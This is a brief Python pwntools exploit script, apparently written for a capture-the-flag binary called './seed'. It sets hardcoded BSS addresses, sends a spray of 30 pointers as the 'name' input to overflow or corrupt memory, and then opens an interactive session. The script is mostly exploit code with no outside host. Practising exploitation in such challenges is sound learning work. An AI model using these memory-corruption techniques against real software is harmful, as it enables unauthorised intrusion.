from pwn import*
p = process('./seed')
# gadget
des_bss = 0x6032A0
name_bss = 0x6031A0

# def
def menu(sel):
	p.sendafter('>> ',str(sel))

def introduce(name):
	menu(0)
	p.sendafter('name : ',name)

pay = ''
pay += p64(name_bss+0x10)*(0xF0/0x8)
introduce(pay)
p.interactive()
